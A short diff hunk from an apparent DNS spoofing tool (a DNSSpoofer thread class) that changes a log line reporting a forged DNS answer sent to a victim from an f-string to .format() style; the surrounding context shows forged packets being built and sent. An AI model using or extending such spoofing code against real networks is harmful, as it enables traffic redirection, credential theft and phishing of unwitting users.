@@ -77,7 +77,8 @@ class DNSSpoofer(threading.Thread):
                 self._build_answer(pkt[DNS], spoof_ip)
             )
             send(forged, iface=self.iface, verbose=False)
-            print(f"[+] Spoofed {qname} → {spoof_ip} for {victim_ip}")
+            print("[+] Spoofed {} → {} for {}".format(qname, spoof_ip, victim_ip))
+
         elif self.relay:
             self._relay(pkt)
 
